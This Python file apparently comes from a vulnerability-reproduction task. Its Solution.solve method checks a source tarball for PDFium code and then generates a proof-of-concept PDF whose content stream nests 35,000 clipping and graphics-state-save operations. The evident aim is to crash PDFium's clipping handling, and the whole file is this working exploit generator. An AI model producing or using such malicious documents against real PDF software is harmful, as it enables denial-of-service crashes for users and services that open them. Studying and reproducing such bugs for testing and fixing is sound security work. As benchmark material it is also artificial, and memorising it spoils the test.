import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        if self._is_pdfium(src_path):
            return self._build_pdf_clip_poc()
        # Fallback: arbitrary small input (unlikely to trigger anything, but keeps behavior defined)
        return b"A" * 100

    def _is_pdfium(self, src_path: str) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for i, member in enumerate(tar):
                    name = member.name.lower()
                    if "pdfium" in name:
                        return True
                    if "core/fpdfapi" in name or "core/fxge" in name or "fpdfsdk" in name:
                        return True
                    if i > 1000:
                        break
        except Exception:
            return False
        return False

    def _build_pdf_clip_poc(self, num_layers: int = 35000) -> bytes:
        # PDF header with binary marker
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

        # Build a very deep nesting of clipping operations in the content stream.
        # Pattern: start with one 'q', then for each layer:
        #   0 0 100 100 re W n q
        # which defines a rectangle, applies it as a clipping path, then saves
        # graphics state again for the next layer. Finally, close all with Q's.
        pattern = "0 0 100 100 re W n q\n"
        content_parts = []
        content_parts.append("q\n")
        content_parts.extend([pattern] * num_layers)
        content_parts.extend(["Q\n"] * (num_layers + 1))
        content_str = "".join(content_parts)
        content_bytes = content_str.encode("ascii")

        # PDF objects
        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        obj3 = (
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
            "endobj\n"
        )
        obj4 = (
            "4 0 obj\n<< /Length "
            + str(len(content_bytes))
            + " >>\nstream\n"
            + content_str
            + "endstream\nendobj\n"
        )

        objects = [obj1, obj2, obj3, obj4]

        # Compute byte offsets for xref
        offsets = []
        current_offset = len(header)
        for obj in objects:
            offsets.append(current_offset)
            current_offset += len(obj.encode("ascii"))

        # Build the PDF body
        pdf = bytearray()
        pdf.extend(header)
        for obj in objects:
            pdf.extend(obj.encode("ascii"))

        # xref table
        xref_offset = len(pdf)
        xref_entries = ["0000000000 65535 f \n"]
        for off in offsets:
            xref_entries.append("{:010d} 00000 n \n".format(off))

        xref_str = (
            "xref\n0 5\n"
            + "".join(xref_entries)
            + "trailer\n<< /Size 5 /Root 1 0 R >>\n"
            + "startxref\n"
            + str(xref_offset)
            + "\n%%EOF\n"
        )
        pdf.extend(xref_str.encode("ascii"))

        return bytes(pdf)
